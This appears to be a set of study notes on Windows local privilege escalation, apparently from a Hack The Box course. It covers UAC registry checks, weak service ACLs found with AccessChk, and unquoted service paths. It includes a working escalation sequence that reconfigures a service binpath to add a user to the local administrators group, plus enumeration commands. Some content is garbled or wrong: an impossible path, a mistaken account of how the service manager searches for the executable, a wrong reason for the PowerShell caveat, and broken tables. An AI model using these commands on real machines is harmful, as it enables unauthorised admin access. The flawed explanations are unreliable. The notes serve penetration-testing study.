# 1 User Account Control (UAC) – quick registry checks

Registry key/value	What it tells you	Expected safe values
```
HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\EnableLUA	Global UAC enable/disable flag.	1 = UAC enabled (default). 0 = UAC disabled → risky.
HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin
```

# 2. Detecting weak permissions on services
## 2.1 General strategy
- Enumerate the ACLs on service registry keys (they live under HKLM\SYSTEM\CurrentControlSet\Services\<svc>).
- Identify any ACE that grants full control (or at least write/SERVICE_START) to a non‑privileged principal (Everyone, BUILTIN\Users, or a low‑privilege domain group).
- Remediate by tightening the ACL (remove the offending ACE, then add a principle‑of‑least‑privilege ACE that only the intended service account can modify).
### 2.2 Low‑tech discovery with AccessChk (Sysinternals)
```
rem  Check for “Everyone” having write‑style rights on every service key
accesschk.exe -kwsu "Everyone" HKLM\SYSTEM\CurrentControlSet\Services
```
```
rem  Same check for the built‑in Users group
accesschk.exe -kwsu "BUILTIN\Users" HKLM\SYSTEM\CurrentControlSet\Services
-k = key, -w = write, -s = subkeys, -u = show the specific rights.
```
If the output lists a service (e.g., RandomProgram) with Full Control or Set Value for those principals, the service is a candidate for privilege‑escalation.

### 2.3 Exploiting a weak‑ACL service (example)
rem  The service “RandomProgram” is owned by “Local System” but its registry key is writable by Everyone.  We can replace the binary that will be launched when the service starts.

```
sc config RandomProgram binpath="cmd /c net localgroup administrators htb-student /add"
sc start RandomProgram
net localgroup administrators   ← confirm our user is now an admin
⚠️ NOTE – Run the sc commands from a cmd.exe session, not PowerShell, because PowerShell will treat sc as an executable and may prepend extra quoting that breaks the binpath string.
```

# 3. Unquoted service paths – classic “space‑in‑path” escalation
## 3.1 What the bug looks like
A service whose binary path is stored without surrounding quotes and whose executable resides in a directory that contains spaces (e.g., C:\Program Files\MyApp\service.exe).
When the Service Control Manager parses the path, it treats the first token before a space as the executable, then looks for that file in the system search order (current directory, %PATH%, etc.). An attacker can place a malicious executable named C:\Program.exe (or C:\Windows\System32\C:\Program.exe) and have it executed with SYSTEM privileges.

## 3.2 Enumeration command (run as any user)
```
wmic service get name,displayname,pathname,startmode ^
    | findstr /i "auto" ^
    | findstr /i /v "c:\windows\\" ^
    | findstr /i /v "\""
Pipe	Purpose
wmic service get …	#List all services (name, display name, binary path, start mode). 
findstr /i "auto"	#Keep only services set to Automatic (most likely to start at boot).
findstr /i /v "c:\windows\\"	#Exclude the safe, built‑in Windows services.
findstr /i /v "\""	#Keep only entries without a leading double‑quote → unquoted paths.
```
## 3.3 Sample output interpretation
Service	Path (unquoted)	Why it is vulnerable

MyVulnSvc	C:\Program Files\MyApp\service.exe	Space in the path, no surrounding quotes → attacker can drop C:\Program.exe.

GoodSvc	"C:\Program Files\MyApp\service.exe"	Properly quoted → not vulnerable.

## 3.4 Exploitation workflow (mermaid diagram)
```mermaid
flowchart LR
    A[Identify unquoted service] --> B[Create malicious executable] --> C[Write the file to a location that appears early in the search order] --> D[Start/trigger the vulnerable service 'sc start']
